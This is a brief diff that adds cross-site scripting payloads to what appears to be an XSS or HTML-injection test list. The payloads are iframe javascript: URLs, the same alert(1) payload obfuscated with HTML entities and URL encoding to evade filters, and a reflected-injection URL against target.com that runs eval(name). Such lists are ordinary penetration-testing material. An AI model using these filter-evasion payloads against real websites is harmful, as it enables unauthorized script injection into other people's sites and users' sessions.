@@ -14,4 +14,8 @@ qq<h1>hi</h1>qq
 &lt;h1&gt;hi&lt;/h1&gt;
 &#60;h1&#62;hi&#60;/h1&#62;
 <iframe src="http://www.armourinfosec.com" title="ARMOUR INFOSEC"></iframe>
- 
+<iframe src="javascript:alert(1)"></iframe>
+<iframe src="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"></iframe>
+<iframe src="javascript:alert(1)"></iframe>
+<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
+<iframe src="http://target.com/something.jsp?inject=<script>eval(name)</script>" name="alert(1)"></iframe>
